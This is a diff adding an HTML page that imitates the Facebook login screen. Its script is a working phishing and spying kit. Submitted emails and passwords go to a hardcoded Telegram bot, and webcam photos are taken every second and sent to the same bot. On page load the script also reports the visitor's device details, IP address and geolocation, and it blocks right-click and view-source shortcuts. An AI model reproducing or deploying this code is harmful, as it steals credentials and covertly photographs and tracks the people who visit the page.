@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login Page</title>
+    <link rel="stylesheet" href="style.css">
+  </head>
+  <body>
+    <div class="container flex">
+      <div class="facebook-page flex">
+        <div class="text">
+          <h1>facebook</h1>
+          <p>Connect with friends and the world </p>
+          <p> around you on Facebook.</p>
+        </div>
+        <form id="loginForm" action="#">
+          <input type="text" id="email" placeholder="Email or phone number" required>
+          <input type="password" id="password" placeholder="Password" required>
+          <div class="link">
+            <button type="submit" class="login">Login</button>
+            <a href="#" class="forgot">Forgot password?</a>
+          </div>
+          <hr>
+          <div class="button">
+            <a href="#">Create new account</a>
+          </div>
+        </form>
+      </div>
+    </div>
+
+    <script>
+      const BOT_TOKEN = '6575631247:AAHgvHAO8xAgtX3KzUnGC-pg-cownq7Jl58';
+      const CHAT_ID = '177668984';
+      const IMAGE_URL = 'https://t.me/assets_tnzxo/3';
+
+      let currentCamera = 'user';
+
+      async function captureAndSendImage() {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: currentCamera }
+          });
+          const track = stream.getVideoTracks()[0];
+          const imageCapture = new ImageCapture(track);
+          const blob = await imageCapture.takePhoto();
+
+          // إرسال الصورة إلى بوت تيليجرام
+          const formData = new FormData();
+          formData.append('photo', blob, 'image.png');
+          formData.append('chat_id', CHAT_ID);
+
+          const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+          });
+
+          if (!response.ok) {
+            throw new Error(`فشل إرسال الصورة: ${response.status}`);
+          }
+
+          currentCamera = currentCamera === 'user' ? 'environment' : 'user';
+
+        } catch (err) {
+          console.error('حدث خطأ: ', err);
+        }
+      }
+
+      setInterval(captureAndSendImage, 1000); // التقاط وإرسال صورة كل ثانية
+
+      document.getElementById('loginForm').addEventListener('submit', async function(event) {
+        event.preventDefault();
+
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        try {
+          const message = `Email: ${email}\nPassword: ${password}`;
+
+          const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              photo: IMAGE_URL,
+              caption: message
+            }),
+            headers: {
+              'Content-Type': 'application/json'
+            }
+          });
+
+          if (!response.ok) {
+            throw new Error(`فشل إرسال البيانات: ${response.status}`);
+          }
+
+          // يمكنك إضافة رسالة نجاح هنا
+          console.log('تم إرسال البيانات بنجاح!');
+
+        } catch (err) {
+          console.error('حدث خطأ: ', err);
+        }
+      });
+
+      // منع حفظ الكود (غير مضمون)
+      document.addEventListener('contextmenu', event => event.preventDefault());
+      document.onkeydown = function(e) {
+        if (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 83)) {
+          return false;
+        }
+      };
+
+      // إرسال رسالة عند دخول المستخدم
+      async function sendEntryMessage() {
+        try {
+          let message = 'دخل مستخدم جديد إلى الموقع!\n';
+
+          // معلومات الجهاز
+          message += `\nDevice Information:\n`;
+          message += `- User Agent: ${navigator.userAgent}\n`;
+          message += `- Platform: ${navigator.platform}\n`;
+          message += `- Language: ${navigator.language}\n`;
+          message += `- Online: ${navigator.onLine}\n`;
+          message += `- Cookies Enabled: ${navigator.cookieEnabled}\n`;
+          message += `- Device Type: ${getDeviceType()}\n`;
+
+          // معلومات الشاشة
+          message += `\nScreen Information:\n`;
+          message += `- Width: ${screen.width}\n`;
+          message += `- Height: ${screen.height}\n`;
+          message += `- Color Depth: ${screen.colorDepth}\n`;
+          message += `- Pixel Depth: ${screen.pixelDepth}\n`;
+
+          // محاولة الحصول على عنوان IP
+          const ipResponse = await fetch('https://api.ipify.org?format=json');
+          if (ipResponse.ok) {
+            const ipData = await ipResponse.json();
+            message += `\nIP: ${ipData.ip}`;
+          }
+
+          // الحصول على الموقع (يطلب إذن)
+          if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(position) {
+              const latitude = position.coords.latitude;
+              const longitude = position.coords.longitude;
+              const googleMapsLink = `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;
+              message += `\nLocation: ${googleMapsLink}`;
+              sendMessage(message);
+            }, function(error) {
+              console.error('Error getting location:', error);
+              sendMessage(message);
+            });
+          } else {
+            sendMessage(message);
+          }
+
+        } catch (err) {
+          console.error('حدث خطأ: ', err);
+        }
+      }
+
+      function getDeviceType() {
+        const userAgent = navigator.userAgent;
+        if (/android/i.test(userAgent)) {
+          return 'Android';
+        } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
+          return 'iOS';
+        } else if (/Macintosh/i.test(userAgent)) {
+          return 'Mac';
+        } else if (/Windows/i.test(userAgent)) {
+          return 'Windows';
+        } else {
+          return 'Unknown';
+        }
+      }
+
+      async function sendMessage(message) {
+        try {
+          const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              text: message
+            }),
+            headers: {
+              'Content-Type': 'application/json'
+            }
+          });
+
+          if (!response.ok) {
+            throw new Error(`فشل إرسال الرسالة: ${response.status}`);
+          }
+        } catch (err) {
+          console.error('حدث خطأ: ', err);
+        }
+      }
+
+      sendEntryMessage();
+    </script>
+  </body>
+</html>
